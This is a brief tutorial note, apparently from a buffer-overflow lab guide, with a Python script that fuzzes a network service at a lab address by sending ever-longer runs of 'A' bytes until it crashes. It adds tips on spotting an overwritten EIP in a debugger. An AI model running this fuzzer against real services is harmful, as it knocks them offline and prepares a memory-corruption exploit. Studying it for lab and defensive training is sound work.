# Buffer Overflow: Fuzzing

Fuzzing determines how many bytes it takes to crash the target application.

## Fuzzing Script
```python
#!/usr/bin/python3
import socket
import sys

ip = "10.10.10.10"
port = 9999

buffer = "A" * 100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        s.send(("COMMAND " + buffer + "\r\n").encode())
        s.close()
        buffer += "A" * 100
    except:
        print(f"Fuzzing crashed at {len(buffer)} bytes")
        sys.exit(0)
```

## What to Watch For
- The application crashes in Immunity Debugger (CPU pane shows 00..)
- EIP may be overwritten with "41414141" (hex for AAAA)
- Note the **approximate** byte count where it crashed
- Use this as a starting point for offset calculation
